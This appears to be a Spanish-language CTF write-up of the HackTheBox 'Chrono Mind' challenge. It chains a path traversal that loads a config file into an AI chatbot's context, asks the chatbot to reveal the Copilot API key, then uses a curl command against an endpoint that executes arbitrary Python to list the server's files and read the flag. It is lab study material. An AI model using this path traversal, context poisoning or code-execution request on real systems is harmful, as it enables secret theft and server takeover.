---
title: Chrono Mind Misc CTF - HackTheBox
layout: post
permalink: /writeups/HTB/CTF/chronomind
date: 2025-02-16 11:00:00 +0000
categories: [HacktheBox, CTF, Misc]
tags: [HacktheBox, CTF, Misc]
image:
  path: /assets/img/cabeceras_genericas/htb.jpg
  alt: Chrono Mind Misc CTF - HackTheBox
description: >
  Guía de explotación de vulnerabilidades en el CTF HackTheBox ChronoMind Misc.
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Contexto

Se nos proporciona acceso a una web con tres opciones de contexto que se le van a proporcionar a la IA para poder hacerle preguntas.

En el código que nos podemos descargar tenemos las funciones principales que usa la API de la IA Chrono Mind.

# Modificando el contexto de la IA

En el fichero "utils.py" vamos a ver la función que se encarga de obtener el fichero de contexto.

```python
def getRepository(topic):
    for suffix in ['', '.md']:
        repoFile = f"{Config.knowledgePath}/{topic}{suffix}"
        print(repoFile)
        if os.path.exists(repoFile):
            return readFile(repoFile)
    return None
```

La variable viene desde el archivo config.py.

```python
import os

class Config():
    roomID = None
    createProgress = False
    chatProgress = False
    knowledgePath = f"{os.getcwd()}/repository"
    copilot_key = "REDACTED_SECRET"
```
Como vemos también se configura una clave API para algo llamado Copilot.

Ahora para poder modificar el contexto de un chat, vamos a interceptar la petición que se hace a la API de /create.

![alt text](/assets/img/writeups/hackthebox/chronomind_htb/image.png)

Al modificar el archivo de contexto haciendo un path traversal, le damos la clave de API que necesitamos para poder llamar a Copilot.

# Función para llamar a Copilot

En la ruta /route/api.py vamos a encontrar el codigo API que maneja la IA.

Una de las funciones que se puede llamar es la llamada a copilot/complete_adn_run

```python
@router.post("/copilot/complete_and_run")
def copilot_complete_and_run(response: Response, params: copilotParams):
    if Config.copilot_key != params.copilot_key:
        response.status_code = 403
        return {"message": "Invalid API key"}

    # get code completion
    completion = lm.code(params.code)

    if not completion.strip():
        return {"message": "Failed to get code completion"}

    full_code = params.code + completion.strip()

    # return the response
    return {"completion": full_code, "result": evalCode(full_code)}
```

Como vemos en la función copilot_complete_and_run, se llama a la función evalCode que se encarga de ejecutar el código completo, pero es necesaria la API_key para poder llamar a Copilot.

Si en utils.py comprobamos el código de la función evalCode

```python
def evalCode(code):
    output = ""
    random = uuid.uuid4().hex
    filename = os.path.join("uploads/") + random + ".py"
        # Guarda el código en un archivo y lo ejecuta
    try:
        with open(filename, "w") as f:
            f.write(code)

        output = subprocess.run(
            ["python3", filename],
            timeout=10,
            capture_output=True,
            text=True,
        ).stdout.strip("\n")

        cleanup(filename)

        return output

    except Exception as e: # handle any exception
        print(e, flush=True)
        cleanup(filename)
        return False
```

Por lo que si conseguimos inyectar codigo lo ejecutará.

# Obteniendo la API_key

Bien, ahora que tenemos el chat con el contexto modificado simplemente le preguntamos a la IA cual es la clave de API.

![alt text](/assets/img/writeups/hackthebox/chronomind_htb/image-1.png)

# Obteniendo la flag

Ahora con la clave de API podemos llamar a Copilot y obtener la flag.

Para saber los parámetros que usa simplemente en api.py podemos observar las variables que se pasan a copilot_complete_and_run.

```python
class copilotParams(BaseModel):
    code: str
    copilot_key: str
```
Ahora mediante curl podemos llamar a copilot/complete_and_run y obtener la flag, ya que sabemos que lo que hace es crear un archiv .py que se ejecuta con el contenido del parámetro code.

1. Listamos los directorios en la raíz del servidor.

```bash
❯ curl -X POST http://94.237.59.180:54043/api/copilot/complete_and_run \
-H "Content-Type: application/json" \
-d '{"code": "import os; print(os.listdir(\"/\"))", "copilot_key": "4928309140372768"}'
{"completion":"import os; print(os.listdir(\"/\"))# 列表\nprint(os.listdir(\"/home/\")) # 打印目录下面的文件","result":"['media', 'var', 'bin', 'srv', 'dev', 'opt', 'run', 'root', 'sys', 'usr', 'sbin', 'mnt', 'proc', 'lib64', 'tmp', 'boot', 'etc', 'lib', 'home', 'readflag']\n['chrono']"}%
```

Si observamos hay un directorio o fichero llamado "readflag". Si nos fijamos en el codigo que nos permiten descargar, encontramos un ficho llamado "readflag.c" que nos permite leer la flag.

Sabiendo esto podemos simplemente ejecutar el fichero y obtener la salida.

![alt text](/assets/img/writeups/hackthebox/chronomind_htb/image-2.png)

